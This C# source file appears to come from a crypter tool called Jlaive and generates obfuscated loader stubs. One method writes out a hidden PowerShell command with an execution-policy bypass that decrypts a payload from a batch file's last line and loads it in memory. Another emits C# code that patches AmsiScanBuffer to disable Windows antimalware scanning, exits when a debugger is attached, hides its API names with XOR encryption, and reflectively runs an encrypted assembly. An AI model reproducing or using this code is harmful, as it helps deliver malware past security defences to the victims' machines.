using System;
using System.Text;

using static Jlaive.Utils;

namespace Jlaive
{
    public class StubGen
    {
        public static string CreatePS(string xorkey, bool hidden, Random rng)
        {
            string varname = RandomString(6, rng);
            string varname2 = RandomString(6, rng);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string functionname2 = RandomString(6, rng);
            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
            return $"pshell.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), '{xorkey}'))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
        }

        public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
        {
            string namespacename = RandomString(10, rng);
            string classname = RandomString(10, rng);
            string xorfunction = RandomString(10, rng);
            string uncompressfunction = RandomString(10, rng);
            string virtualprotect = RandomString(10, rng);
            string checkremotedebugger = RandomString(10, rng);
            string isdebuggerpresent = RandomString(10, rng);
            string key = RandomString(20, rng);
            string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
            string amsiscanbuffer_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
            string checkremotedebugger_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
            string isdebuggerpresent_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key));
            return @"using System;
using System.Diagnostics;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;

namespace " + namespacename + @"
{
    internal class " + classname + @"
    {
        [DllImport(""kernel32.dll"")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
        " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
        " + (antidebug ? $"delegate bool {isdebuggerpresent}();" : string.Empty) + @"

        static string payload = """ + encrypted + @""";

        static void Main(string[] args)
        {
            " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"

            " + (antidebug ?
@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), """ + key + @""")));
IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), """ + key + @""")));
" + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
" + isdebuggerpresent + @" IsDebuggerPresent = (" + isdebuggerpresent + @")Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(" + isdebuggerpresent + @"));
bool remotedebug = false;
CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);" : string.Empty) + @"

            " + (bamsi ?
            @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
            " + virtualprotect + @" VirtualProtect = (" + virtualprotect + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + virtualprotect + @"));
            IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), """ + key + @""")));

            byte[] patch;
            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint old;
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, asbaddr, patch.Length);
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"

            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + xorfunction + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint;
            try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
            catch { entry.Invoke(null, null); }
        }

        static byte[] " + xorfunction + @"(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
            }
            return input;
        }

        static byte[] " + uncompressfunction + @"(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }
    }
}";
        }
    }
}
